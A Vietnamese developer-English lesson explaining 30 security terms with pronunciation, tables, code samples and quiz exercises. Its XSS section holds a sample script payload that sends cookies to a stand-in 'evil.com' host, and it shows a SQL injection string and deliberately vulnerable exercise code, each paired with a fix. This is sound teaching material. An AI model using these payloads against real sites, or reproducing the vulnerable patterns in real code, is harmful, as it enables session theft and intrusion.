---
title: "30 Thuật Ngữ Security Mà Developer Cần Biết — Từ Vựng Bảo Mật"
slug: "30-thuat-ngu-security-developer-can-biet"
date: 2026-03-17
summary: "30 thuật ngữ security quan trọng nhất cho developer — từ vựng bảo mật, phát âm IPA, ví dụ thực tế trong code và hệ thống."
description: "Tổng hợp 30 thuật ngữ security mà developer Việt Nam cần biết. Từ vựng bảo mật tiếng Anh có IPA, giải thích dễ hiểu, ví dụ thực tế — từ authentication đến zero-day exploit."
tags: ["security", "cybersecurity", "it-english", "developer", "vocabulary", "bao-mat"]
categories: ["workplace-english"]
ShowToc: true
TocOpen: true
draft: false
---

> 📱 **Học IELTS miễn phí:** [App IELTS 6.0](https://ielts.eng4it.com)

## Giới thiệu

Security không còn là chuyện riêng của team bảo mật — **mọi developer đều cần hiểu security**. Từ việc viết code an toàn, đọc security audit reports, đến tham gia incident response — bạn sẽ gặp các thuật ngữ bảo mật hàng ngày.

Thực tế phũ phàng: **90% các lỗ hổng bảo mật** bắt nguồn từ code của developer, không phải từ hạ tầng. OWASP Top 10, SQL Injection, XSS — những thứ này developer phải biết để **phòng tránh từ đầu**.

Bài viết này giúp bạn:
- Nắm **30 thuật ngữ security** quan trọng nhất
- Biết **cách phát âm chuẩn** (IPA) — không còn đọc sai trong meeting
- Hiểu **ý nghĩa thực tế** qua ví dụ code và hệ thống
- Phân biệt các khái niệm hay nhầm lẫn

---

## 1. Authentication & Authorization — Xác thực & Phân quyền

Đây là hai khái niệm **nền tảng nhất** trong security, và cũng hay bị nhầm lẫn nhất:

| Thuật ngữ | IPA | Nghĩa tiếng Việt | Giải thích |
|-----------|-----|-------------------|------------|
| **Authentication (AuthN)** | /ɔːˌθɛntɪˈkeɪʃən/ | Xác thực | Xác minh *bạn là ai* — login, mật khẩu, vân tay |
| **Authorization (AuthZ)** | /ˌɔːθərəˈzeɪʃən/ | Phân quyền | Xác minh *bạn được làm gì* — role, permission |
| **Multi-Factor Authentication (MFA)** | /ˌmʌlti ˈfæktər/ | Xác thực đa yếu tố | Kết hợp 2+ phương thức: password + OTP + biometrics |
| **Single Sign-On (SSO)** | /ˌsɪŋɡl saɪn ɒn/ | Đăng nhập một lần | Login 1 lần, truy cập nhiều hệ thống (Google, Okta) |
| **OAuth 2.0** | /əʊˈɔːθ/ | Giao thức ủy quyền | Cho phép app truy cập resource thay mặt user |
| **JSON Web Token (JWT)** | /dʒɒt/ | Token dạng JSON | Token chứa thông tin user, tự xác thực (stateless) |

### 💡 Phân biệt Authentication vs Authorization

```
Authentication = "Who are you?" → Login, verify identity
Authorization  = "What can you do?" → Check permissions, roles

Ví dụ thực tế:
- Bạn quẹt thẻ vào tòa nhà → Authentication ✅
- Bạn chỉ được vào tầng 3, không được lên tầng 5 → Authorization ✅
```

### Ví dụ trong code:

```javascript
// Authentication — xác thực user
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findByEmail(email);
  const isValid = await bcrypt.compare(password, user.passwordHash);
  // "Are you really who you claim to be?"
});

// Authorization — kiểm tra quyền
app.delete('/api/posts/:id', authorize('admin'), (req, res) => {
  // Only admins can delete posts
  // "You're logged in, but can you do THIS?"
});
```

---

## 2. Common Vulnerabilities — Lỗ hổng phổ biến

Những lỗ hổng mà developer **gây ra nhiều nhất** và **cần phòng tránh**:

| Thuật ngữ | IPA | Nghĩa tiếng Việt | Giải thích |
|-----------|-----|-------------------|------------|
| **SQL Injection (SQLi)** | /ˌɛskjuːˈɛl ɪnˈdʒɛkʃən/ | Tấn công chèn SQL | Chèn SQL độc hại qua input — lỗi kinh điển |
| **Cross-Site Scripting (XSS)** | /krɒs saɪt ˈskrɪptɪŋ/ | Tấn công chèn script | Chèn JavaScript độc vào trang web |
| **Cross-Site Request Forgery (CSRF)** | /siː-sɜːrf/ | Giả mạo request | Lừa user gửi request mà họ không biết |
| **Remote Code Execution (RCE)** | /rɪˈməʊt kəʊd ˌɛksɪˈkjuːʃən/ | Thực thi code từ xa | Attacker chạy code trên server — cực kỳ nguy hiểm |
| **Denial of Service (DoS/DDoS)** | /dɪˈnaɪəl əv ˈsɜːvɪs/ | Tấn công từ chối dịch vụ | Làm quá tải server, không phục vụ được user thật |
| **Man-in-the-Middle (MITM)** | /mæn ɪn ðə ˈmɪdl/ | Tấn công xen giữa | Chặn và đọc/sửa dữ liệu giữa 2 bên |

### 🔥 SQL Injection — Ví dụ kinh điển

```sql
-- ❌ Code dính SQL Injection:
query = "SELECT * FROM users WHERE email = '" + userInput + "'"
-- Attacker nhập: ' OR '1'='1' --
-- Kết quả: SELECT * FROM users WHERE email = '' OR '1'='1' --'
-- → Trả về TẤT CẢ users!

-- ✅ Fix: Dùng Parameterized Query
query = "SELECT * FROM users WHERE email = $1"
params = [userInput]
```

### 🔥 XSS — Ví dụ thực tế

```html
<!-- ❌ Vulnerable: render trực tiếp user input -->
<div>Welcome, ${userName}</div>
<!-- Attacker đặt tên: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script> -->

<!-- ✅ Fix: Escape HTML entities -->
<div>Welcome, ${escapeHtml(userName)}</div>
```

---

## 3. Encryption & Data Protection — Mã hóa & Bảo vệ dữ liệu

| Thuật ngữ | IPA | Nghĩa tiếng Việt | Giải thích |
|-----------|-----|-------------------|------------|
| **Encryption** | /ɪnˈkrɪpʃən/ | Mã hóa | Chuyển dữ liệu thành dạng không đọc được |
| **Decryption** | /diːˈkrɪpʃən/ | Giải mã | Chuyển dữ liệu mã hóa về dạng gốc |
| **Hashing** | /ˈhæʃɪŋ/ | Băm | Chuyển dữ liệu thành chuỗi cố định, **một chiều** (không giải ngược) |
| **SSL/TLS** | /ˌɛsɛsˈɛl tiːɛlˈɛs/ | Giao thức mã hóa | Mã hóa kết nối giữa client và server (HTTPS) |
| **Public Key / Private Key** | /ˈpʌblɪk kiː/ | Khóa công khai / bí mật | Cặp khóa bất đối xứng — public mã hóa, private giải mã |
| **Certificate (Cert)** | /sərˈtɪfɪkət/ | Chứng chỉ số | Xác nhận danh tính server (SSL cert cho HTTPS) |

### 💡 Encryption vs Hashing — Khác nhau thế nào?

```
Encryption (mã hóa):
  "Hello" → encrypt(key) → "x7$kQ9" → decrypt(key) → "Hello"
  ✅ Hai chiều — có thể giải ngược
  📌 Dùng cho: truyền dữ liệu, lưu thông tin nhạy cảm cần đọc lại

Hashing (băm):
  "Hello" → hash() → "185f8db32271fe25f561a6fc938b2e26..."
  ❌ Một chiều — KHÔNG giải ngược được
  📌 Dùng cho: lưu password, verify file integrity
```

### Ví dụ trong code:

```python
import bcrypt
import hashlib

# Hashing password — ĐÚNG CÁCH
password = "mySecurePass123"
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# Lưu `hashed` vào DB, KHÔNG BAO GIỜ lưu plaintext password!

# Verify password
is_match = bcrypt.checkpw(password.encode(), hashed)  # True

# Hashing file — kiểm tra integrity
file_hash = hashlib.sha256(open("app.zip", "rb").read()).hexdigest()
# So sánh với hash gốc để biết file có bị sửa không
```

---

## 4. Network & Infrastructure Security — Bảo mật mạng & hạ tầng

| Thuật ngữ | IPA | Nghĩa tiếng Việt | Giải thích |
|-----------|-----|-------------------|------------|
| **Firewall** | /ˈfaɪərwɔːl/ | Tường lửa | Lọc traffic vào/ra hệ thống theo rules |
| **VPN (Virtual Private Network)** | /viːpiːˈɛn/ | Mạng riêng ảo | Tạo tunnel mã hóa qua internet |
| **WAF (Web Application Firewall)** | /wæf/ | Tường lửa ứng dụng web | Chặn tấn công web (SQLi, XSS) ở tầng application |
| **Penetration Testing (Pentest)** | /ˌpɛnɪˈtreɪʃən/ | Kiểm thử xâm nhập | Tấn công thử hệ thống để tìm lỗ hổng |
| **Vulnerability** | /ˌvʌlnərəˈbɪlɪti/ | Lỗ hổng bảo mật | Điểm yếu có thể bị khai thác |
| **Exploit** | /ɪkˈsplɔɪt/ | Khai thác lỗ hổng | Code/kỹ thuật lợi dụng vulnerability |

### 📌 Ví dụ thực tế — Security trong AWS

```yaml
# AWS Security Group — Firewall rules
SecurityGroup:
  Type: AWS::EC2::SecurityGroup
  Properties:
    GroupDescription: "Web server security group"
    SecurityGroupIngress:
      - IpProtocol: tcp
        FromPort: 443        # HTTPS only
        ToPort: 443
        CidrIp: 0.0.0.0/0   # Allow from anywhere
      - IpProtocol: tcp
        FromPort: 22          # SSH
        ToPort: 22
        CidrIp: 10.0.0.0/8   # Only from internal network ✅
    # ❌ KHÔNG mở port 22 cho 0.0.0.0/0 (toàn bộ internet)!
```

---

## 5. Security Practices & Concepts — Khái niệm & phương pháp

| Thuật ngữ | IPA | Nghĩa tiếng Việt | Giải thích |
|-----------|-----|-------------------|------------|
| **Zero Trust** | /ˈzɪərəʊ trʌst/ | Không tin tưởng mặc định | Verify everything, trust nothing — luôn xác thực |
| **Least Privilege** | /liːst ˈprɪvɪlɪdʒ/ | Quyền tối thiểu | Chỉ cấp đúng quyền cần thiết, không hơn |
| **Zero-Day (0-day)** | /ˈzɪərəʊ deɪ/ | Lỗ hổng chưa có bản vá | Vulnerability chưa ai biết, chưa có fix |
| **Patch** | /pætʃ/ | Bản vá | Update sửa lỗ hổng bảo mật |
| **Sanitize / Sanitization** | /ˈsænɪtaɪz/ | Làm sạch dữ liệu | Lọc bỏ ký tự nguy hiểm từ user input |
| **OWASP** | /ˈəʊwɒsp/ | Tổ chức bảo mật web | Open Web Application Security Project — chuẩn bảo mật web |

### 💡 Nguyên tắc Least Privilege — Áp dụng hàng ngày

```bash
# ❌ Sai: Chạy app bằng root
docker run --user root myapp

# ✅ Đúng: Tạo user riêng với quyền tối thiểu
docker run --user appuser:appgroup myapp

# ❌ Sai: IAM policy cho phép tất cả
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

# ✅ Đúng: Chỉ cho quyền cần thiết
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-bucket/*"
}
```

---

## 6. Bảng tổng hợp — Quick Reference

| # | Thuật ngữ | Viết tắt | Category |
|---|-----------|----------|----------|
| 1 | Authentication | AuthN | Identity |
| 2 | Authorization | AuthZ | Access Control |
| 3 | Multi-Factor Authentication | MFA | Identity |
| 4 | Single Sign-On | SSO | Identity |
| 5 | OAuth 2.0 | — | Protocol |
| 6 | JSON Web Token | JWT | Token |
| 7 | SQL Injection | SQLi | Vulnerability |
| 8 | Cross-Site Scripting | XSS | Vulnerability |
| 9 | Cross-Site Request Forgery | CSRF | Vulnerability |
| 10 | Remote Code Execution | RCE | Vulnerability |
| 11 | Denial of Service | DoS/DDoS | Attack |
| 12 | Man-in-the-Middle | MITM | Attack |
| 13 | Encryption | — | Data Protection |
| 14 | Decryption | — | Data Protection |
| 15 | Hashing | — | Data Protection |
| 16 | SSL/TLS | — | Protocol |
| 17 | Public/Private Key | — | Cryptography |
| 18 | Certificate | Cert | Identity |
| 19 | Firewall | FW | Network |
| 20 | VPN | — | Network |
| 21 | Web Application Firewall | WAF | Network |
| 22 | Penetration Testing | Pentest | Practice |
| 23 | Vulnerability | Vuln | Concept |
| 24 | Exploit | — | Concept |
| 25 | Zero Trust | ZT | Architecture |
| 26 | Least Privilege | — | Principle |
| 27 | Zero-Day | 0-day | Vulnerability |
| 28 | Patch | — | Maintenance |
| 29 | Sanitize | — | Practice |
| 30 | OWASP | — | Standard |

---

## 7. Mẫu câu hay dùng — Useful Phrases

### Trong Code Review:

| English | Tiếng Việt |
|---------|------------|
| "This input is not sanitized — potential XSS vulnerability." | Input này chưa được lọc — có thể bị XSS. |
| "We should use parameterized queries to prevent SQL injection." | Nên dùng parameterized query để tránh SQL injection. |
| "This endpoint needs authentication middleware." | Endpoint này cần middleware xác thực. |
| "The API key is hardcoded — it should be in environment variables." | API key đang hardcode — nên để trong biến môi trường. |
| "We need to implement rate limiting to prevent DDoS." | Cần thêm rate limiting để chống DDoS. |

### Trong Meeting / Báo cáo:

| English | Tiếng Việt |
|---------|------------|
| "We discovered a critical vulnerability in the login flow." | Phát hiện lỗ hổng nghiêm trọng trong flow đăng nhập. |
| "The penetration test revealed three high-severity issues." | Pentest phát hiện 3 vấn đề mức độ nghiêm trọng cao. |
| "We need to patch this before the next release." | Cần vá lỗi này trước lần release tiếp. |
| "All user passwords are hashed with bcrypt." | Tất cả password user được hash bằng bcrypt. |
| "We follow the principle of least privilege for all IAM roles." | Áp dụng nguyên tắc quyền tối thiểu cho mọi IAM role. |

---

## 8. Practice — Bài tập thực hành

### Bài 1: Chọn đáp án đúng

1. **_____ verifies WHO you are, while _____ determines WHAT you can do.**
   - a) Authorization / Authentication
   - b) Authentication / Authorization ✅
   - c) Encryption / Hashing

2. **Which vulnerability allows attackers to inject malicious SQL code?**
   - a) XSS
   - b) CSRF
   - c) SQL Injection ✅

3. **Hashing is different from encryption because hashing is:**
   - a) Faster
   - b) One-way (irreversible) ✅
   - c) More secure

### Bài 2: Tìm lỗi bảo mật trong code

```python
# Đoạn code này có bao nhiêu lỗi bảo mật?
import os

password = "admin123"  # 🔴 Lỗi 1?
db_query = f"SELECT * FROM users WHERE name = '{user_input}'"  # 🔴 Lỗi 2?
os.system(f"ping {host_input}")  # 🔴 Lỗi 3?
```

<details>
<summary>📝 Đáp án</summary>

1. **Hardcoded password** — Mật khẩu để trực tiếp trong code → Dùng environment variable
2. **SQL Injection** — String interpolation trong query → Dùng parameterized query
3. **Command Injection (RCE)** — User input trực tiếp vào os.system → Dùng subprocess với shell=False

</details>

### Bài 3: Viết security review comment

Đồng nghiệp submit PR với đoạn code sau. Hãy viết 1 review comment bằng tiếng Anh:

```javascript
app.post('/api/user', (req, res) => {
  const token = req.headers.authorization;
  // No token validation!
  db.query(`INSERT INTO users (name) VALUES ('${req.body.name}')`);
  res.json({ success: true });
});
```

<details>
<summary>📝 Gợi ý</summary>

> "Two security concerns here:
> 1. The authorization token is read but never validated — any request will pass through. We need to verify the JWT before processing.
> 2. The SQL query uses string interpolation which is vulnerable to SQL injection. Please use parameterized queries instead.
> Both are critical — this should not be merged until fixed."

</details>

---

## Kết luận

Security là trách nhiệm của **mọi developer**, không chỉ riêng team security. Nắm vững 30 thuật ngữ này giúp bạn:

- **Viết code an toàn hơn** — biết phòng tránh SQLi, XSS, CSRF
- **Giao tiếp tự tin** trong security review và incident response
- **Đọc hiểu** security reports, audit results, CVE advisories

📌 **Tip**: Bookmark trang [OWASP Top 10](https://owasp.org/www-project-top-ten/) và review mỗi quý — đây là danh sách 10 lỗ hổng web phổ biến nhất, cập nhật thường xuyên.

---

*Bạn thấy bài viết hữu ích? Chia sẻ cho đồng nghiệp developer để cùng nâng cao nhận thức bảo mật nhé!* 🔒
